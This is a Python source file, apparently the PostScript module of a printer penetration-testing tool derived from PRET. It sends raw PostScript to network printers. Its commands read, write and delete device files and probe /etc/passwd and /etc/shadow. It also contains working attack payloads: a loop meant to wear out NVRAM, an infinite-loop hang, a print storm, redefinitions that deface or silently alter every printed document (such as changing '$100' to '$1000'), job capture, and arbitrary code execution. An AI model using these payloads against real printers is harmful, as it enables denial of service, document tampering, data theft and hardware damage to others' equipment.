#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PostScript Module for PrinterReaper v2.4.0
==========================================
Complete PostScript penetration testing module with 40+ commands

Based on PRET ps.py but massively enhanced for PrinterReaper
"""

import re
import os
import random
import posixpath
import time

from core.printer import printer
from utils.operators import operators
from utils.helper import log, output, conv, file, item, chunks, const as c


class ps(printer):
    """
    PostScript shell for PrinterReaper - Complete Implementation
    """

    def __init__(self, args):
        super().__init__(args)
        self.ops = operators()  # Load PostScript operators database
        self.prompt = f"{self.target}:ps> "

    # --------------------------------------------------------------------
    # Help overview (category-based, PJL-style)
    # --------------------------------------------------------------------
    def do_help(self, arg):
        """Show help for commands (PostScript)"""
        topic = (arg or "").strip()
        if topic:
            # Delegate to base generic help for specific topics
            return super().do_help(topic)

        # Categories aligned with README
        categories = {
            "filesystem": [
                "ls", "get", "put", "delete", "cat"
            ],
            "information": [
                "id", "version", "devices", "uptime", "date", "dicts", "dump", "known", "search", "pagecount"
            ],
            "control": [
                "config", "restart", "reset", "hold", "display"
            ],
            "security": [
                "lock", "unlock", "disable", "enumerate_operators", "test_file_access", "permissions", "chmod"
            ],
            "attacks": [
                "destroy", "hang", "overlay", "cross", "replace", "capture", "payload"
            ],
            "advanced": [
                "exec_ps"
            ],
        }

        # Flatten to include only implemented names
        implemented = {name for name in dir(self) if name.startswith("do_")}
        def exists(cmd):
            return f"do_{cmd}" in implemented

        # Print header
        print()
        print("PrinterReaper - PostScript Commands")
        print("=" * 70)
        print("Available command categories:")
        total = 0
        for cat, cmds in categories.items():
            avail = [c for c in cmds if exists(c)]
            total += len(avail)
            label = cat.ljust(13)
            print(f"  {label}- {len(avail)} commands")
        print()
        print(f"Total: {total} PostScript commands available")
        print("Use 'help <command>' for specific details")
        print()
        # Optional: list commands per category in columns
        for cat, cmds in categories.items():
            avail = [c for c in cmds if exists(c)]
            if not avail:
                continue
            print(cat.capitalize() + ":")
            print("-" * 70)
            colw = max(len(x) for x in avail) + 2
            cols = max(1, 70 // colw)
            for i in range(0, len(avail), cols):
                row = avail[i:i+cols]
                print("".join(x.ljust(colw) for x in row))
            print()

    # --------------------------------------------------------------------
    # Low-level PostScript send/receive
    
    def cmd(self, str_send, wait=True, crop=True, binary=False):
        """
        Send a PostScript command and optionally wait for its reply.
        """
        token = c.DELIMITER + str(random.randrange(2**16))
        footer = f"({token}\\n) print flush\n" if wait else ""
        payload = c.UEL + c.PS_HEADER + str_send + "\n" + footer + c.UEL

        # log the command
        log().write(self.logfile, str_send + os.linesep)
        # send
        self.send(payload)

        if not wait:
            return ""

        # receive until token with timeout
        try:
            if hasattr(self.conn, '_sock') and self.conn._sock:
                self.conn._sock.settimeout(30.0)
            
            raw = self.recv(re.escape(token) + r".*$", wait, True, binary)
        except Exception as e:
            output().errmsg(f"Failed to receive response: {str(e)}")
            return ""
        
        # Parse PostScript errors
        errors = re.findall(c.PS_ERROR, raw)
        if errors:
            for error in errors:
                output().errmsg(f"PostScript Error: {error}")
        
        return raw

    def on_connect(self, mode):
        """
        Initialize PostScript environment on first connect.
        """
        if mode == "init":
            # Enter PostScript mode
            self.cmd("%!", False)

    # --------------------------------------------------------------------
    # 📋 SYSTEM INFORMATION COMMANDS
    # --------------------------------------------------------------------

    def do_id(self, *args):
        "Show comprehensive printer identification (PostScript-specific)"
        print("PostScript Printer Identification:")
        print("=" * 60)
        
        # Get product name
        product = self.cmd("statusdict begin product = end")
        if product:
            print(f"Product: {product.strip()}")
        
        # Get version
        version = self.cmd("version print")
        if version:
            print(f"PS Version: {version.strip()}")
        
        # Get serial number
        serial = self.cmd("serialnumber print")
        if serial:
            print(f"Serial Number: {serial.strip()}")

    def help_id(self):
        """Show help for id command"""
        print()
        print("id - Show PostScript printer identification")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Displays comprehensive printer identification including")
        print("  product name, PostScript version, and serial number.")
        print()
        print("USAGE:")
        print("  id")
        print()
        print("EXAMPLES:")
        print("  id                           # Show printer identification")
        print()
        print("NOTES:")
        print("  - Uses PostScript operators: product, version, serialnumber")
        print("  - Information from statusdict")
        print()

    def do_version(self, *args):
        "Show PostScript interpreter version"
        version = self.cmd("version print")
        if version:
            print(f"PostScript Version: {version.strip()}")

    def help_version(self):
        """Show help for version command"""
        print()
        print("version - Show PostScript interpreter version")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Displays the PostScript interpreter version.")
        print()
        print("USAGE:")
        print("  version")
        print()

    def do_devices(self, *args):
        "List available I/O devices"
        result = self.cmd("""
        (*) { (%) exch cvs print (\\n) print } 100 string /IODevice resourceforall
        """)
        if result:
            print("Available I/O Devices:")
            print(result)

    def help_devices(self):
        """Show help for devices command"""
        print()
        print("devices - List available I/O devices")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Lists all available I/O devices in the PostScript environment.")
        print()
        print("USAGE:")
        print("  devices")
        print()

    def do_uptime(self, *args):
        "Show system uptime"
        uptime = self.cmd("realtime 100 div print")
        if uptime:
            print(f"Uptime: {conv().elapsed(uptime, 1)} seconds")

    def do_date(self, *args):
        "Show printer's system date and time"
        # PostScript doesn't have built-in date, but we can try
        result = self.cmd("realtime print")
        if result:
            print(f"System Time (ticks): {result.strip()}")

    # --------------------------------------------------------------------
    # 📁 FILESYSTEM COMMANDS
    # --------------------------------------------------------------------

    def do_ls(self, arg):
        "List files in PostScript filesystem"
        path = arg or "(%disk0%)"
        result = self.cmd(f"""
        {path} (*) {{
            dup print (\\n) print
        }} 100 string filenameforall
        """)
        if result:
            print("Files:")
            print(result)

    def help_ls(self):
        """Show help for ls command"""
        print()
        print("ls - List files in PostScript filesystem")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Lists files in the PostScript filesystem using filenameforall.")
        print()
        print("USAGE:")
        print("  ls [path]")
        print()
        print("EXAMPLES:")
        print("  ls                           # List files in default location")
        print("  ls (%disk0%)                 # List files on disk0")
        print()

    def do_get(self, arg):
        "Download file from printer"
        if not arg:
            output().errmsg("Usage: get <file>")
            return
        
        result = self.cmd(f"""
        ({arg}) (r) file
        dup 4096 string readstring
        pop print
        closefile
        """)
        
        if result:
            lpath = os.path.basename(arg)
            file().write(lpath, result.encode())
            output().message(f"Downloaded {arg} to {lpath}")

    def help_get(self):
        """Show help for get command"""
        print()
        print("get - Download file from printer")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Downloads a file from the printer's PostScript filesystem")
        print("  using the file operator to read file contents.")
        print()
        print("USAGE:")
        print("  get <file>")
        print()
        print("EXAMPLES:")
        print("  get /etc/passwd              # Download passwd file")
        print("  get (%disk0%)config.ps       # Download from disk0")
        print()

    def do_put(self, arg):
        "Upload file to printer"
        if not arg:
            output().errmsg("Usage: put <local_file>")
            return
        
        if not os.path.exists(arg):
            output().errmsg(f"Local file not found: {arg}")
            return
        
        data = file().read(arg)
        if not data:
            return
        
        # Escape special characters
        escaped = data.decode('latin-1', errors='ignore').replace('\\', '\\\\').replace('(', '\\(').replace(')', '\\)')
        
        remote = os.path.basename(arg)
        result = self.cmd(f"""
        ({remote}) (w) file
        ({escaped}) writestring
        closefile
        """)
        
        output().message(f"Uploaded {arg} to printer")

    def do_delete(self, arg):
        "Delete file from printer"
        if not arg:
            output().errmsg("Usage: delete <file>")
            return
        
        result = self.cmd(f"({arg}) deletefile")
        output().message(f"Deleted {arg}")

    def help_delete(self):
        """Show help for delete command"""
        print()
        print("delete - Delete file from printer")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Removes a file from the PostScript filesystem using deletefile operator.")
        print()
        print("USAGE:")
        print("  delete <file>")
        print()

    # --------------------------------------------------------------------
    # 🔒 SECURITY AND CONTROL COMMANDS
    # --------------------------------------------------------------------

    def do_lock(self, arg):
        "Set system and startjob passwords"
        if not arg:
            arg = input("Password: ")
        
        result = self.cmd(f"""
        serverdict begin 0 exitserver
        statusdict begin
        ({arg}) setsystemparamspassword
        ({arg}) setstartjobpassword
        end
        """)
        output().message(f"Printer locked with password: {arg}")

    def help_lock(self):
        """Show help for lock command"""
        print()
        print("lock - Set system and startjob passwords")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Sets passwords to restrict access to system parameters")
        print("  and startjob operations.")
        print()
        print("USAGE:")
        print("  lock [password]")
        print()

    def do_unlock(self, arg):
        "Unset system and startjob passwords"
        if not arg:
            arg = input("Password: ")
        
        result = self.cmd(f"""
        ({arg}) 0 exitserver
        statusdict begin
        () setsystemparamspassword
        () setstartjobpassword
        end
        """)
        output().message("Printer unlocked")

    def do_restart(self, *arg):
        "Restart PostScript interpreter"
        output().warning("Restarting PostScript interpreter...")
        self.cmd("systemdict /quit get exec", False)

    def help_restart(self):
        """Show help for restart command"""
        print()
        print("restart - Restart PostScript interpreter")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Restarts the PostScript interpreter, clearing all state.")
        print()
        print("USAGE:")
        print("  restart")
        print()

    def do_reset(self, *arg):
        "Reset PostScript settings to factory defaults"
        output().warning("Resetting to factory defaults...")
        confirm = input("Are you sure? (yes/no): ")
        if confirm.lower() == 'yes':
            self.cmd("erasepage initgraphics")
            output().message("Reset complete")

    def do_disable(self, *arg):
        "Disable printing functionality"
        self.cmd("nulldevice")
        output().message("Printing disabled")

    def help_disable(self):
        """Show help for disable command"""
        print()
        print("disable - Disable printing functionality")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Redirects output to null device, effectively disabling printing.")
        print()
        print("USAGE:")
        print("  disable")
        print()

    # --------------------------------------------------------------------
    # 💥 ATTACK COMMANDS
    # --------------------------------------------------------------------

    def do_destroy(self, *arg):
        "Cause physical damage to printer's NVRAM (PostScript)"
        output().warning("⚠️⚠️⚠️ DESTRUCTIVE ATTACK ⚠️⚠️⚠️")
        output().warning("This may permanently damage the printer!")
        
        confirm = input("Type 'DESTROY' to confirm: ")
        if confirm == 'DESTROY':
            # Repeatedly erase and write to NVRAM
            output().warning("Executing destructive command...")
            self.cmd("""
            0 1 10000 {
                pop
                erasepage
                initgraphics
            } for
            """, False)
            output().warning("Destructive command executed")
        else:
            output().info("Cancelled")

    def help_destroy(self):
        """Show help for destroy command"""
        print()
        print("destroy - Cause physical damage to NVRAM")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  ⚠️⚠️⚠️ DESTRUCTIVE - Attempts to cause physical damage")
        print("  to the printer's NVRAM by repeatedly erasing.")
        print()
        print("USAGE:")
        print("  destroy")
        print()
        print("WARNINGS:")
        print("  ⚠️  MAY CAUSE PERMANENT HARDWARE DAMAGE")
        print("  ⚠️  CANNOT BE UNDONE")
        print("  ⚠️  REQUIRES 'DESTROY' CONFIRMATION")
        print()

    def do_hang(self, *arg):
        "Execute PostScript infinite loop"
        output().warning("Executing infinite loop - printer will hang!")
        confirm = input("Continue? (yes/no): ")
        if confirm.lower() == 'yes':
            self.cmd("{ } loop", False)

    def help_hang(self):
        """Show help for hang command"""
        print()
        print("hang - Execute PostScript infinite loop")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Sends an infinite loop command that hangs the printer.")
        print("  Printer will require power cycle to recover.")
        print()
        print("USAGE:")
        print("  hang")
        print()

    def do_overlay(self, arg):
        "Put overlay EPS file on all hardcopies"
        if not arg:
            output().errmsg("Usage: overlay <file.eps>")
            return
        
        if not os.path.exists(arg):
            output().errmsg(f"File not found: {arg}")
            return
        
        eps_data = file().read(arg)
        if not eps_data:
            return
        
        # Load EPS as overlay
        self.cmd(f"""
        /showpage {{
            gsave
            {eps_data.decode('latin-1', errors='ignore')}
            grestore
            showpage
        }} bind def
        """)
        output().message(f"Overlay {arg} will be added to all printed pages")

    def help_overlay(self):
        """Show help for overlay command"""
        print()
        print("overlay - Add EPS overlay to all prints")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Loads an EPS file that will be overlaid on all subsequent")
        print("  printed pages. Useful for watermarks or demonstrations.")
        print()
        print("USAGE:")
        print("  overlay <file.eps>")
        print()
        print("EXAMPLES:")
        print("  overlay logo.eps             # Add logo to all pages")
        print("  overlay watermark.eps        # Add watermark")
        print()

    def do_cross(self, arg):
        "Put text graffiti on all hardcopies"
        if not arg:
            output().errmsg("Usage: cross <text>")
            return
        
        self.cmd(f"""
        /showpage {{
            gsave
            /Helvetica findfont 20 scalefont setfont
            100 700 moveto
            ({arg}) show
            grestore
            showpage
        }} bind def
        """)
        output().message(f"Text '{arg}' will be added to all printed pages")

    def help_cross(self):
        """Show help for cross command"""
        print()
        print("cross - Add text watermark to all prints")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Adds text graffiti/watermark to all subsequent printed pages.")
        print()
        print("USAGE:")
        print("  cross <text>")
        print()
        print("EXAMPLES:")
        print("  cross CONFIDENTIAL           # Add CONFIDENTIAL watermark")
        print("  cross 'SAMPLE - NOT FOR DISTRIBUTION'")
        print()

    def do_replace(self, arg):
        "Replace string in all documents"
        if not arg:
            output().errmsg("Usage: replace <old> <new>")
            return
        
        parts = arg.split(None, 1)
        if len(parts) != 2:
            output().errmsg("Usage: replace <old> <new>")
            return
        
        old, new = parts
        self.cmd(f"""
        /show {{
            dup ({old}) search {{
                pop pop ({new}) show
            }} {{
                show
            }} ifelse
        }} bind def
        """)
        output().message(f"Will replace '{old}' with '{new}' in all documents")

    def help_replace(self):
        """Show help for replace command"""
        print()
        print("replace - Replace string in printed documents")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Replaces all occurrences of a string in documents being printed.")
        print()
        print("USAGE:")
        print("  replace <old> <new>")
        print()
        print("EXAMPLES:")
        print("  replace Public Confidential")
        print("  replace $100 $1000")
        print()

    def do_capture(self, *arg):
        "Capture print jobs to file"
        output().message("Enabling print job capture...")
        self.cmd("""
        /showpage {
            currentpagedevice /OutputFile (%stdout) (w) file put
            setpagedevice
        } bind def
        """)
        output().message("Print jobs will be captured")

    def help_capture(self):
        """Show help for capture command"""
        print()
        print("capture - Capture print jobs")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Redirects print output to capture print jobs.")
        print()
        print("USAGE:")
        print("  capture")
        print()

    def do_hold(self, *arg):
        "Enable job retention"
        self.cmd("true 0 startjob { /JobRetention true def } stopped pop")
        output().message("Job retention enabled")

    # --------------------------------------------------------------------
    # 🔍 INFORMATION GATHERING
    # --------------------------------------------------------------------

    def do_dicts(self, *arg):
        "List all dictionaries and their permissions"
        result = self.cmd("""
        currentdict { pop = } forall
        """)
        if result:
            print("Dictionaries:")
            print(result)

    def help_dicts(self):
        """Show help for dicts command"""
        print()
        print("dicts - List all dictionaries")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Lists all available dictionaries in the PostScript environment.")
        print()
        print("USAGE:")
        print("  dicts")
        print()

    def do_dump(self, arg):
        "Dump dictionary contents"
        dict_name = arg or "systemdict"
        result = self.cmd(f"""
        {dict_name} {{ 
            dup type /nametype eq {{ 
                dup = = cvs print ( ) print
            }} if
            pop
        }} forall
        """)
        if result:
            print(f"Contents of {dict_name}:")
            print(result)

    def help_dump(self):
        """Show help for dump command"""
        print()
        print("dump - Dump dictionary contents")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Dumps the contents of a PostScript dictionary.")
        print()
        print("USAGE:")
        print("  dump [dict_name]")
        print()
        print("EXAMPLES:")
        print("  dump systemdict              # Dump system dictionary")
        print("  dump statusdict              # Dump status dictionary")
        print("  dump userdict                # Dump user dictionary")
        print()

    def do_known(self, arg):
        "Test if PostScript operator is supported"
        if not arg:
            output().errmsg("Usage: known <operator>")
            return
        
        result = self.cmd(f"""
        /{arg} where {{
            pop (Operator '{arg}' is SUPPORTED) print
        }} {{
            (Operator '{arg}' is NOT supported) print
        }} ifelse
        """)
        if result:
            print(result)

    def help_known(self):
        """Show help for known command"""
        print()
        print("known - Test if PostScript operator is supported")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Checks if a specific PostScript operator is available.")
        print()
        print("USAGE:")
        print("  known <operator>")
        print()
        print("EXAMPLES:")
        print("  known file                   # Test if 'file' operator exists")
        print("  known deletefile             # Test if 'deletefile' exists")
        print()

    def do_search(self, arg):
        "Search all dictionaries for key"
        if not arg:
            output().errmsg("Usage: search <key>")
            return
        
        result = self.cmd(f"""
        /{arg} where {{
            (Found in dictionary) print
            pop pop
        }} {{
            (Not found) print
        }} ifelse
        """)
        if result:
            print(result)

    def do_enumerate_operators(self, *arg):
        "Enumerate supported PostScript operators"
        print("Enumerating PostScript Operators...")
        print("=" * 60)
        
        for category, ops in self.ops.oplist.items():
            print(f"\n{category}")
            print("-" * 60)
            supported = []
            for op in ops:
                # Test if operator is known
                result = self.cmd(f"/{op} where {{ pop (1) }} {{ (0) }} ifelse print", wait=True)
                if result and '1' in result:
                    supported.append(op)
            
            if supported:
                print(f"Supported ({len(supported)}/{len(ops)}): {', '.join(supported)}")
            else:
                print("None supported")

    def help_enumerate_operators(self):
        """Show help for enumerate_operators command"""
        print()
        print("enumerate_operators - Test all PostScript operators")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Tests all 400+ PostScript operators from the operators database")
        print("  to determine which are supported by this printer.")
        print()
        print("USAGE:")
        print("  enumerate_operators")
        print()
        print("NOTES:")
        print("  - Tests 16 operator categories")
        print("  - May take several minutes")
        print("  - Useful for vulnerability assessment")
        print()

    # --------------------------------------------------------------------
    # 🎨 CONFIGURATION AND MANIPULATION
    # --------------------------------------------------------------------

    def do_config(self, arg):
        "Change printer settings"
        if not arg:
            print("Available configurations:")
            print("  duplex        - Set duplex printing")
            print("  copies <n>    - Set number of copies")
            print("  economode     - Set economic mode")
            print("  negative      - Set negative print")
            print("  mirror        - Set mirror inversion")
            return
        
        if arg == "duplex":
            self.cmd("<</Duplex true>> setpagedevice")
        elif arg.startswith("copies "):
            num = arg.split()[1]
            self.cmd(f"<</NumCopies {num}>> setpagedevice")
        elif arg == "economode":
            self.cmd("<</EconoMode true>> setpagedevice")
        elif arg == "negative":
            self.cmd("-1 1 scale")
        elif arg == "mirror":
            self.cmd("1 -1 scale")
        
        output().message(f"Configuration '{arg}' applied")

    def help_config(self):
        """Show help for config command"""
        print()
        print("config - Change printer settings")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Modifies various printer settings via setpagedevice.")
        print()
        print("USAGE:")
        print("  config <setting>")
        print()
        print("SETTINGS:")
        print("  duplex        - Enable duplex printing")
        print("  copies <n>    - Set number of copies")
        print("  economode     - Enable toner saving")
        print("  negative      - Invert colors")
        print("  mirror        - Mirror image")
        print()

    def do_pagecount(self, *arg):
        "Show printer's page counter"
        result = self.cmd("statusdict /pagecount get exec print")
        if result:
            print(f"Page Count: {result.strip()}")

    def help_pagecount(self):
        """Show help for pagecount command"""
        print()
        print("pagecount - Show page counter")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Displays the total number of pages printed by the device.")
        print()
        print("USAGE:")
        print("  pagecount")
        print()

    # --------------------------------------------------------------------
    # 🧪 PAYLOADS
    # --------------------------------------------------------------------

    def do_payload(self, arg):
        "Execute PostScript payload"
        if not arg:
            print("Available payloads:")
            print("  banner <text>    - Print banner with text")
            print("  loop             - Infinite loop (hangs printer)")
            print("  erase            - Erase page")
            print("  storm            - Print storm (many pages)")
            return
        
        parts = arg.split(None, 1)
        payload_name = parts[0]
        payload_arg = parts[1] if len(parts) > 1 else ""
        
        if payload_name == "banner":
            text = payload_arg or "PRINTERREAPER"
            self.cmd(f"""
            /Helvetica findfont 16 scalefont setfont
            100 700 moveto
            ({text}) show
            showpage
            """)
        elif payload_name == "loop":
            self.do_hang("")
        elif payload_name == "erase":
            self.cmd("initgraphics erasepage showpage")
        elif payload_name == "storm":
            count = payload_arg or "100"
            self.cmd(f"""
            /Helvetica findfont 20 scalefont setfont
            0 1 {count} {{
                dup 20 mul 100 moveto
                (PRINTERREAPER STORM) show
                showpage
            }} for
            """)
        
        output().message(f"Payload '{payload_name}' executed")

    def help_payload(self):
        """Show help for payload command"""
        print()
        print("payload - Execute PostScript payloads")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Executes pre-built PostScript attack payloads.")
        print()
        print("USAGE:")
        print("  payload <name> [args]")
        print()
        print("PAYLOADS:")
        print("  banner <text>    - Print banner page")
        print("  loop             - Infinite loop (DoS)")
        print("  erase            - Erase current page")
        print("  storm [count]    - Print storm attack")
        print()

    # --------------------------------------------------------------------
    # 🔬 ADVANCED TESTING
    # --------------------------------------------------------------------

    def do_test_file_access(self, *arg):
        "Test file system access capabilities"
        print("Testing PostScript File System Access...")
        print("=" * 60)
        
        tests = [
            ("/etc/passwd", "System password file"),
            ("/etc/shadow", "Shadow password file"),
            ("(%disk0%)*", "Disk0 files"),
            ("(%statementstatus%)", "Statement status"),
        ]
        
        for path, desc in tests:
            result = self.cmd(f"""
            ({path}) (r) file {{
                (ACCESSIBLE: {desc}) print
                closefile
            }} {{
                (DENIED: {desc}) print
            }} ifelse
            """)
            if result:
                print(result)

    def help_test_file_access(self):
        """Show help for test_file_access command"""
        print()
        print("test_file_access - Test filesystem access")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Tests access to various sensitive files and locations.")
        print()
        print("USAGE:")
        print("  test_file_access")
        print()

    def do_exec_ps(self, arg):
        "Execute arbitrary PostScript code"
        if not arg:
            output().errmsg("Usage: exec_ps <postscript code>")
            return
        
        result = self.cmd(arg)
        if result:
            print("Output:")
            print(result)

    def help_exec_ps(self):
        """Show help for exec_ps command"""
        print()
        print("exec_ps - Execute arbitrary PostScript code")
        print("=" * 60)
        print("DESCRIPTION:")
        print("  Sends raw PostScript code directly to the printer.")
        print()
        print("USAGE:")
        print("  exec_ps <postscript_code>")
        print()
        print("EXAMPLES:")
        print("  exec_ps (Hello World) print")
        print("  exec_ps statusdict /product get =")
        print()
        print("NOTES:")
        print("  - Requires PostScript knowledge")
        print("  - No validation performed")
        print("  - May crash printer if invalid")
        print()

    # Implement standard file operations
    def get(self, path):
        """Internal method to get file"""
        result = self.cmd(f"({path}) (r) file dup 4096 string readstring pop print closefile")
        if result:
            return (len(result), result.encode())
        return c.NONEXISTENT

    def put(self, path, data):
        """Internal method to put file"""
        escaped = data.decode('latin-1', errors='ignore').replace('\\', '\\\\').replace('(', '\\(').replace(')', '\\)')
        self.cmd(f"({path}) (w) file ({escaped}) writestring closefile")
        return len(data)

    def delete(self, path):
        """Internal method to delete file"""
        self.cmd(f"({path}) deletefile")
        return True

    # File system traversal support
    def dirlist(self, path="", r=False, l=False):
        """List directory contents"""
        search_path = path or "(%disk0%)*"
        result = self.cmd(f"""
        ({search_path}) {{ 
            dup print (\\n) print 
        }} 100 string filenameforall
        """)
        return result if result else ""

    def fswalk(self, path, cmd_type="find"):
        """Walk filesystem"""
        listing = self.dirlist(path)
        if listing:
            for line in listing.split('\n'):
                if line.strip():
                    if cmd_type == "find":
                        print(line.strip())
                    elif cmd_type == "mirror":
                        self.mirror(line.strip(), 0)

